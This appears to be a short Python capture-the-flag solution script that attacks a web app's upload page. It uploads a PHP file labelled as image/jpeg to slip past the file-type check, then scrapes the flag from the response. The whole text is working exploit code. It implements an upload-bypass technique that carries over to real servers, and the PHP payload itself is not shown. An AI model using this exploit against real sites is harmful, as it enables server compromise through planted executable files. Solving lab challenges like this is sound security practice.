import requests

ip = input("site ip = ")

headers = {}
try:
	files = {
		'uploaded': ('file.php', open('file.php', 'rb'), 'image/jpeg'),
		'Upload': (None, 'Upload')
	}
	response = requests.post(f"http://{ip}/?page=upload", headers=headers, files=files)
	if response.status_code == 200:
		content = str(response.content)
		start = content.index("The flag is")
		end = content.index("<", start)
		flag = content[start:end]
		print(flag)
except Exception as e:
	print(e)
